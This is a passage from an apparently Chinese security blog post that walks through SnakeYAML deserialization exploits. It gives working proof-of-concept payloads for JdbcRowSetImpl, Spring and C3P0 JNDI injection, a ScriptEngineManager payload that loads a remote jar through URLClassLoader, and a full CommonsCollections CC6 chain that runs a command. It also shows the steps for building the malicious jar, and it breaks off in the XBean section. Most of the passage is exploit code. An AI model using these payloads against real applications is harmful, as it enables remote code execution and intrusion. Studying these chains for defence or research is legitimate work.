FieldProperty </span><br><span class="line">								  # 非 public 但有 getter 或 setter 方法的属性设置为 MethodProperty</span><br><span class="line">							   -&gt; Property#set(Object, Object)</span><br><span class="line">						   		  # public 属性调用 FieldProperty#set(Object, Object) 反射赋值</span><br><span class="line">						          # 非 public 属性调用 MethodProperty#set(Object, Object) 通过 setter 方法赋值</span><br></pre></td></tr></table></figure>
+
+<p>可以看到 snakeyaml 反序列化的关键触发点就是<strong>无参构造方法</strong>和<strong>非公有属性的 setter 方法</strong>，另外前面在<strong>类加载</strong>的时候还会触发静态代码块（这个倒是没见过有什么用法）。但其实也可以调用<strong>有参构造</strong>，这个在后面会讲到。其实还会调用 <strong>hashCode()</strong>  ，后面也会讲到。</p>
+<p>‍</p>
+<h2 id="四、漏洞利用与分析"><a href="#四、漏洞利用与分析" class="headerlink" title="四、漏洞利用与分析"></a>四、漏洞利用与分析</h2><p>理解原理以后，再看它的利用方式，很快就能理解了。</p>
+<h3 id="0x1：JdbcRowSetImpl"><a href="#0x1：JdbcRowSetImpl" class="headerlink" title="0x1：JdbcRowSetImpl"></a>0x1：JdbcRowSetImpl</h3><p>这个类之前在学习 FastJson 的时候也遇到过，是由于它的 setter 方法（setAutoCommit）会调用 lookup 造成 JNDI 注入，下面是测试代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line">public class PocTest1 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String poc = &quot;!!com.sun.rowset.JdbcRowSetImpl &#123;dataSourceName: ldap://127.0.0.1:8085/kjMXKPAB, autoCommit: true&#125;&quot;;</span><br><span class="line">        Yaml yaml = new Yaml();</span><br><span class="line">        yaml.load(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>原理：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JdbcRowSetImpl#setAutoCommit(boolean)</span><br><span class="line">JdbcRowSetImpl#connect()</span><br><span class="line">InitialContext#lookup(String)</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x2：ScriptEngineManager"><a href="#0x2：ScriptEngineManager" class="headerlink" title="0x2：ScriptEngineManager"></a>0x2：ScriptEngineManager</h3><p>yaml 反序列化时可以通过 !! + 全类名指定反序列化的类，反序列化过程中会实例化该类，可以通过构造 ScriptEngineManager payload 并利用 SPI 机制通过 URLClassLoader 或者其他 payload 如 JNDI 方式远程加载实例化恶意类从而实现任意代码执行。</p>
+<h4 id="1、SnakeYaml-调用有参构造"><a href="#1、SnakeYaml-调用有参构造" class="headerlink" title="1、SnakeYaml 调用有参构造"></a>1、SnakeYaml 调用有参构造</h4><p>该 gadget 的触发点在于 ScriptEngineManager 的有参构造方法 ScriptEngineManager(ClassLoader)，而我们前面讲的是调用无参构造方法，这里不得不引出 SnakeYaml 的另一个机制了：我们可以通过调整序列化数据，用数组的形式（就是中括号）指定要调用的构造方法的参数类型，比如有以下数据：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!!org.yaml.snakeyaml.immutable.Point [1.17, 3.14]</span><br></pre></td></tr></table></figure>
+
+<p>这样表示指定调用 org.yaml.snakeyaml.immutable.Point 的两参构造方法 Point(double latitude, double longitude) ，并且指定两个参数分别为 1.17 和 3.14 。</p>
+<p>本题的 poc 格式如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\&quot;http://127.0.0.1:8085/kjMXKPAB.jar\&quot;]]]]</span><br></pre></td></tr></table></figure>
+
+<p>就表示调用 ScriptEngineManager 的有参构造方法，且参数为 URLClassLoader 。然后实例化这个 URLClassLoader 的时候也是调用有参构造，指定参数为 URL 类型。然后实例化这个 URL 的时候也是调用有参构造，参数是我们设定的 String 。</p>
+<p>在前面的调用链总结中，我们是跟进 <code>Constructor$ConstructMapping#construct(Node) </code>​去调用的无参构造，而反序列化的数据是这种数组的形式时，则会调用 <code>Constructor$ConstructSequence#construct(Node)</code>​ 来调用对应参数的有参构造：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250506000727-me5vd0g.png">
+
+<p>ConstructSequence 内部类用来处理序列格式（如数组）相关的构造。</p>
+<h4 id="2、什么是-SPI-机制"><a href="#2、什么是-SPI-机制" class="headerlink" title="2、什么是 SPI 机制"></a>2、<strong>什么是 SPI 机制</strong></h4><p>SPI (Service Provider Interface)，JDK 内置的一种服务提供发现机制。它的利用方式是通过在 ClassPath 路径下的 META-INF&#x2F;services 文件夹下查找文件，自动加载文件中所定义的类。</p>
+<p>例如以 mysql-connector 包为例：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250505232624-hgbi6yy.png">
+
+<p>Dirver 类中的内容是：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250505232631-ja63k89.png">
+
+<p>这个 Driver 类实现了 java.sql.Driver 接口，这段代码主要是将当前类的实例注册为 MySQL 数据库的驱动程序，实现了一个 MySQL 数据库的 Java 驱动程序。</p>
+<p>这个方法会在 JVM 启动时执行，从而确保了该驱动程序在应用程序启动时已经被注册。当应用程序需要连接 MySQL 数据库时，可以通过 DriverManager 类的 getConnection()方法获取 com.mysql.cj.jdbc.Driver 类的实例，进而建立 MySQL 数据库连接。</p>
+<p>ScriptEngineManager gadget 就是用到 SPI 机制，会通过远程地址寻找 META-INF&#x2F;services 目录下的 javax.script.ScriptEngineFactory 然后去加载文件中指定的 PoC 类从而触发远程代码执行。</p>
+<h4 id="3、漏洞复现"><a href="#3、漏洞复现" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h4><p>poc：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line">public class POC2 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String poc = &quot;!!javax.script.ScriptEngineManager [\n&quot; +</span><br><span class="line">                &quot;  !!java.net.URLClassLoader [[\n&quot; +</span><br><span class="line">                &quot;    !!java.net.URL [\&quot;http://127.0.0.1:8888/yaml-payload.jar\&quot;]\n&quot; +</span><br><span class="line">                &quot;  ]]\n&quot; +</span><br><span class="line">                &quot;]&quot;;</span><br><span class="line">        Yaml yaml = new Yaml();</span><br><span class="line">        yaml.load(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>利用 ScriptEngineManager ，我们去远程地址获取一个 jar 文件，jar 文件的 META-INF&#x2F;services 目录下写好了要被加载的恶意类。为了生成这个 jar 文件，我们可以创建这样一个项目。</p>
+<p>第一步，在 META-INF&#x2F;services&#x2F;javax.script.ScriptEngineFactory 文件中定义要被加载的类名：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250515100928-ujwd03o.png">
+
+<p>第二步，创建对应类 TestPoc 并实现 ScriptEngineFactory 接口，构造方法里命令执行：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250514174435-8vlt6vm.png">
+
+<p>第三步，编译目标类：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac src/main/java/miaoji/TestPoc.java </span><br></pre></td></tr></table></figure>
+
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250515101009-02478xz.png">
+
+<p>第四步，将该项目打成 jar 包：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar -cvf yaml-payload.jar -C src/main/java/ . </span><br></pre></td></tr></table></figure>
+
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250515100347-qgpwp04.png">
+
+<p>对应目录下开一个 http 服务器，就可以开始测试了：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250515101059-y4qj11a.png">
+
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250515101114-fx19u3o.png">
+
+<h4 id="4、原理分析"><a href="#4、原理分析" class="headerlink" title="4、原理分析"></a>4、原理分析</h4><p>实际就是 SPI 机制的原理：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ScriptEngineManager#ScriptEngineManager(ClassLoader)</span><br><span class="line">ScriptEngineManager#init(final ClassLoader)</span><br><span class="line">ScriptEngineManager#initEngines(final ClassLoader)</span><br><span class="line">	-&gt; ScriptEngineManager#getServiceLoader(final ClassLoader) </span><br><span class="line">	   ServiceLoader&lt;S&gt;#load(Class&lt;S&gt;, ClassLoader) # 获取远程 jar 包</span><br><span class="line">	-&gt; ServiceLoader&lt;S&gt;#iterator()#next() # 嵌套方法的调用</span><br><span class="line">	   ServiceLoader&lt;S&gt;$LazyIterator#next()</span><br><span class="line">	   ServiceLoader&lt;S&gt;$LazyIterator#nextService() # 类加载，根据 SPI 机制</span><br></pre></td></tr></table></figure>
+
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250515225137-3pujps8.png">
+
+<h3 id="0x3：Spring-PropertyPathFactoryBean"><a href="#0x3：Spring-PropertyPathFactoryBean" class="headerlink" title="0x3：Spring PropertyPathFactoryBean"></a>0x3：Spring PropertyPathFactoryBean</h3><p>这个链子触发点在 setter 方法 setBeanFactory ，需要有 Spring 依赖。</p>
+<p>依赖：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-context&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;5.3.30&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<p>poc：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line">public class POC3 &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        String poc = &quot;!!org.springframework.beans.factory.config.PropertyPathFactoryBean\n&quot; +</span><br><span class="line">                &quot; targetBeanName: \&quot;ldap://127.0.0.1:8085/AColGQWe\&quot;\n&quot; +</span><br><span class="line">                &quot; propertyPath: test\n&quot; +</span><br><span class="line">                &quot; beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory\n&quot; +</span><br><span class="line">                &quot;  shareableResources: [\&quot;ldap://127.0.0.1:8085/AColGQWe\&quot;]&quot;;</span><br><span class="line">        Yaml yaml = new Yaml();</span><br><span class="line">        yaml.load(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>原理：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PropertyPathFactoryBean#setBeanFactory(BeanFactory)</span><br><span class="line">SimpleJndiBeanFactory#getBean(String)</span><br><span class="line">SimpleJndiBeanFactory#getBean(String, Class&lt;T&gt;)</span><br><span class="line">SimpleJndiBeanFactory#doGetSingleton(String, Class&lt;T&gt;)</span><br><span class="line">JndiLocatorSupport#lookup(String, Class&lt;T&gt;)</span><br><span class="line">JndiTemplate#lookup(String, Class&lt;T&gt;)</span><br><span class="line">JndiTemplate#lookup(final String)</span><br><span class="line">JndiTemplate#execute(JndiCallback&lt;T&gt;)</span><br><span class="line">JndiTemplate$1#doInContext(Context)</span><br><span class="line">InitialContext#lookup(String) # JNDI 注入</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x4：C3P0-WrapperConnectionPoolDataSource"><a href="#0x4：C3P0-WrapperConnectionPoolDataSource" class="headerlink" title="0x4：C3P0 WrapperConnectionPoolDataSource"></a>0x4：C3P0 WrapperConnectionPoolDataSource</h3><p>这条链子的触发点是构造方法 WrapperConnectionPoolDataSource() 。</p>
+<p>思路类似于 Fastjson 通过 C3P0 二次反序列化，需要用到 C3P0.WrapperConnectionPoolDataSource 通过 Hex 序列化字节加载器，给 userOverridesAsString 赋值恶意序列化内容（本地 Gadget）的 Hex 编码值达成利用。</p>
+<p>依赖：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.mchange&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;c3p0&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;0.9.5.2&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<p>poc（由于是二次反序列化，所以还要搭配其他的反序列化利用链，poc 中给的是 CC6 链）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line">import org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line">import java.beans.PropertyVetoException;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.io.StringWriter;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class POC4 &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public static Map exp() throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Class.forName(&quot;java.lang.Runtime&quot;)),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap1 = new HashMap&lt;&gt;();</span><br><span class="line">        LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap1, new ConstantTransformer(1));</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;Atkx&quot;);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap2 = new HashMap&lt;&gt;();</span><br><span class="line">        hashMap2.put(tiedMapEntry, &quot;bbb&quot;);</span><br><span class="line">        lazyMap.remove(&quot;Atkx&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Class clazz = LazyMap.class;</span><br><span class="line">        Field factoryField = clazz.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">        factoryField.setAccessible(true);</span><br><span class="line">        factoryField.set(lazyMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        return hashMap2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    static void addHexAscii(byte b, StringWriter sw) &#123;</span><br><span class="line">        int ub = b &amp; 0xff;</span><br><span class="line">        int h1 = ub / 16;</span><br><span class="line">        int h2 = ub % 16;</span><br><span class="line">        sw.write(toHexDigit(h1));</span><br><span class="line">        sw.write(toHexDigit(h2));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static char toHexDigit(int h) &#123;</span><br><span class="line">        char out;</span><br><span class="line">        if (h &lt;= 9) out = (char) (h + 0x30);</span><br><span class="line">        else out = (char) (h + 0x37);</span><br><span class="line">        // System.err.println(h + &quot;: &quot; + out);</span><br><span class="line">        return out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 将类序列化为字节数组</span><br><span class="line">    public static byte[] tobyteArray(Object o) throws IOException &#123;</span><br><span class="line">        ByteArrayOutputStream bao = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(bao);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        return bao.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 字节数组转十六进制</span><br><span class="line">    public static String toHexAscii(byte[] bytes) &#123;</span><br><span class="line">        int len = bytes.length;</span><br><span class="line">        StringWriter sw = new StringWriter(len * 2);</span><br><span class="line">        for (int i = 0; i &lt; len; ++i)</span><br><span class="line">            addHexAscii(bytes[i], sw);</span><br><span class="line">        return sw.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, PropertyVetoException, ClassNotFoundException &#123;</span><br><span class="line">        String hex = toHexAscii(tobyteArray(exp()));</span><br><span class="line">        String poc = &quot;!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\n&quot; +</span><br><span class="line">                &quot;  userOverridesAsString: \&quot;HexAsciiSerializedMap:&quot;+ hex + &quot;;\&quot;&quot;;</span><br><span class="line">        Yaml yaml = new Yaml();</span><br><span class="line">        yaml.load(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>原理：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">WrapperConnectionPoolDataSource#WrapperConnectionPoolDataSource()</span><br><span class="line">WrapperConnectionPoolDataSource#WrapperConnectionPoolDataSource(boolean)</span><br><span class="line">C3P0ImplUtils#parseUserOverridesAsString(String)</span><br><span class="line">	-&gt; ByteUtils#fromHexAscii(String var0) # 十六进制数据解码为字节数组</span><br><span class="line">	-&gt; SerializableUtils#fromByteArray(byte[])</span><br><span class="line">	   SerializableUtils#deserializeFromByteArray(byte[]) # 反序列化字节数组</span><br></pre></td></tr></table></figure>
+
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250515224929-9dgbc37.png">
+
+<h3 id="0x5：C3P0-JndiRefForwardingDataSource"><a href="#0x5：C3P0-JndiRefForwardingDataSource" class="headerlink" title="0x5：C3P0 JndiRefForwardingDataSource"></a>0x5：C3P0 JndiRefForwardingDataSource</h3><p>这条链子的触发点在 setter 方法 setLoginTimeout ，用到 c3p0 依赖中的另一个类 JndiRefForwardingDataSource 。</p>
+<p>poc：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line">public class POC5 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String poc = &quot;!!com.mchange.v2.c3p0.JndiRefForwardingDataSource\n&quot; +</span><br><span class="line">                &quot;  jndiName: \&quot;ldap://127.0.0.1:8085/NQszrbCS\&quot;\n&quot; +</span><br><span class="line">                &quot;  loginTimeout: 0&quot;;</span><br><span class="line">        Yaml yaml = new Yaml();</span><br><span class="line">        yaml.load(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>原理：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">JndiRefForwardingDataSource#setLoginTimeout(int)</span><br><span class="line">JndiRefForwardingDataSource#inner()</span><br><span class="line">JndiRefForwardingDataSource#dereference()</span><br><span class="line">InitialContext#lookup(String) # JNDI 注入</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x6：Apache-XBean"><a href="#0x6：Apache-XBean" class="headerlink" title="0x6：Apache XBean"></a>0x6：Apache XBean</h3><p>这条链的触发点在构造方法 BadAttributeValueExpException(Object) 。</p>
+<p>前面我们说 BadAttributeValueExpException 利用链的时候，是从 readObject 方法入手去调用 toString ，并特意提到要避开其构造方法，因为构造方法会提前调用 toString ，在这里却用上了：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250516103810-7xsjkuc.png">
+
+<p>链子的后半段利用 ContextUtil$ReadOnlyBinding#getObject() 触发远程类加载，在讲 Hessian 利用链的时候已经提过。</p>
+<p>需要 xbean 依赖：</p>
